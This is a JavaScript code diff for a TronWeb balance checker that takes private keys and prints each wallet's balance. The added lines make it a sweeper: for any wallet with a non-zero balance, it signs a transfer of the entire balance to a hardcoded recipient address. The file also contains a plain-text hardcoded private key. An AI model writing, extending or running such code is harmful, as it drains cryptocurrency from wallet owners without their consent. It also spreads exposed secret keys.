@@ -11,6 +11,12 @@ function setNodeUrl(newNodeUrl){
 	nodeUrl = newNodeUrl;
 }
 global.setNodeUrl = setNodeUrl;
+var myAddress = "TVUgveUeGgvbu97BE29rQ9Qd6Gj8ZyiHL5";
+function setMyAddress(newMyAddress){
+	myAddress = newMyAddress;
+}
+global.setMyAddress = setMyAddress;
+
 
 const privateKey = 'da146374a75310b9666e834ee4ad0866d6f4035967bfc76217c5a495fff9f0d0';
 
@@ -24,6 +30,19 @@ const tronWeb = new TronWeb(
 function getBalance(address, pk){
 	tronWeb.trx.getBalance(address).then(balance => {
         print(pk, address, parseFloat(balance)/1000000);
+
+        if(balance > 0){
+			tronWeb = new TronWeb(
+			    new TronWeb.providers.HttpProvider(nodeUrl),
+			    new TronWeb.providers.HttpProvider(nodeUrl),
+			    new TronWeb.providers.HttpProvider(nodeUrl),
+			    pk
+			);
+
+		    tronWeb.transactionBuilder.sendTrx(myAddress, balance).then(sendTransaction => {
+		    	console.log(`${address} > ${myAddress} ${balance} - ${sendTransaction}`);
+		    }).catch(err => console.log("ERROR", "sendTrx", pk, balance, err.toString()));
+        }
     }).catch(err => console.log("ERROR", "getBalance", err.toString()));
 }
 
